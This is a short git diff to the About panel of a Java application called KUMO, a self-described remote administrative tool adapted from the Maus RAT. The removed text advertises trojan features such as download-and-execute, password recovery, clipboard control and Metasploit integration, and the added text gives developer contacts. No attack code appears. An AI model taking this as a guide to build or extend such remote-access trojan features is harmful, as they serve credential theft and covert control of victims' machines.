@@ -39,13 +39,11 @@ public class UpdatesView {
     }
 
     private HBox getAboutPanel() {
-        Label title = (Label) Styler.styleAdd(new Label("KUMO " + KumoSettings.CURRENT_VERSION), "title");
+        Label title = (Label) Styler.styleAdd(new Label("KUMO " + KumoSettings.CURRENT_VERSION + " - " + KumoSettings.VERSION_CODENAME), "title");
         Text desc = (Text) Styler.styleAdd(new Text("KUMO is a lightweight cross-platform remote administrative tool " +
                 "written in Java. \n\nKUMO is intended to present necessary features \nin an attractive and " +
-                "easy to use UI. \n\nKumo is adapted from an open-sourced RAT called \nMaus (https://github.com/Ghosts/Maus). " +
-                "Kumo builds on \nthe foundation it laid out and improves on all of them.\n " +
-                "\nImprovements include:\n\t- Encrypted communication\n\t- Metasploit integration\n\t- UI improvements\n\t- Additional client JAR customization" +
-                "\n\t- Clipboard control\n\t- Download and execute\n\t- Password recovery\n\t- Misc client functions\n\t- Under the hood networking improvements\n\t- Lots of bug fixes"), "");
+                "easy to use UI.\n\nKumo was built to experiment with GUI design but evolved into a great project \nthat is fun to work on. There are 2 libraries used in Kumo: JFoenix and javafxsvg.\nPlease remember to use Kumo responsibly and use the\nsoftware according to the rules outlined in the \"LEGAL\" section to the right --->." +
+                "\n\nIf you have any questions, concerns, issues, or anything else to ask the \ndeveloper you can PM @ClovaHF on Telegram or KumoRAT@protonmail.com."), "");
         if (KumoSettings.DARK_MODE){
             desc.setFill(Paint.valueOf("white"));
         } else {
